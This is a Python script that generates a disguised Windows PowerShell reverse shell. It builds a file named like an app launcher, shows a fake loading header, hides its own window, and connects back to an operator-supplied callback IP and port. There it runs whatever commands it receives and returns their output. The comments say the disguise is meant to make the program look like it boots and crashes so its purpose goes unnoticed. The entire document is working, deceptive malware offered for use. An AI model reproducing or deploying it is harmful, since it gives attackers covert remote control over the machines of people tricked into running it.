# simple Windows Reverse-shell, disguised
# to look like a program that boots up and then crashes
# to make it easyer to explain away as 'worked o my machine'

# Hide window: https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/show-or-hide-windows
# Revshell: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

# ---- BASE-SHELL ----
base = """#[HEADER]

#requires -Version 5
# this enum works in PowerShell 5 only
# in earlier versions, simply remove the enum,
# and use the numbers for the desired window state
# directly

Enum ShowStates
{
  Hide = 0
  Normal = 1
  Minimized = 2
  Maximized = 3
  ShowNoActivateRecentPosition = 4
  Show = 5
  MinimizeActivateNext = 6
  MinimizeNoActivate = 7
  ShowNoActivate = 8
  Restore = 9
  ShowDefault = 10
  ForceMinimize = 11
}


# the C#-style signature of an API function (see also www.pinvoke.net)
$code = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'

# add signature as new type to PowerShell (for this session)
$type = Add-Type -MemberDefinition $code -Name myAPI -PassThru

# access a process
# (in this example, we are accessing the current PowerShell host
#  with its process ID being present in $pid, but you can use
#  any process ID instead)
$process = Get-Process -Id $PID

# get the process window handle
$hwnd = $process.MainWindowHandle

# apply a new window size to the handle, i.e. hide the window completely
$type::ShowWindowAsync($hwnd, [ShowStates]::Hide)

$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
"""

# ---- Program Customizer ----
# Get CnC server addr/port
ip = input("callback IP [fallback: 127.0.0.1]: ") or "127.0.0.1"
port = input("callback Port [fallback: 9001]: ") or "9001"
# Obfuscation data
filename = input("filename [fallback: AppLauncher.ps1]: ") or "AppLauncher.ps1"
print("Create Header [For loading screen] [empty-line to finalize] [fallback blank]: ")

# Create header
text = [];i = ""
while True:
    i = input()
    if len(i)==0:
        break
    text.append(i)
text='\n'.join(['Write-Host "'+line.strip()+'"' for line in text])
# Write file and replace data
with open(filename,"w") as f:f.write(base.replace("#[HEADER]",text).replace("127.0.0.1",ip).replace("9001",port).replace('Write-Host ""\n',''))